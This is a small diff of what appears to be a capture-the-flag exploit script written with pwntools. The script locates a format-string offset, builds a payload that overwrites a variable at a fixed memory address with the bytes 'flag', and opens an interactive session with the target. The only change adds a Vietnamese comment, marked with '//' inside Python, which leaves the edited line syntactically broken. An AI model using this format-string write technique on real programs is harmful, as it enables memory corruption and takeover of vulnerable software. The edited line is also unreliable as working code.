@@ -93,7 +93,7 @@ def exec_fmt(payload):
 autofmt = FmtStr(exec_fmt)
 offset = autofmt.offset
 
-payload = fmtstr_payload(offset, {0x404060: 0x67616c66})
+payload = fmtstr_payload(offset, {0x404060: 0x67616c66}) // Ghi đè giá trị 0x67616c66 lên địa chỉ 0x404060 ( địa chỉ biến sus )
 
 p.sendline(payload)
 p.interactive()
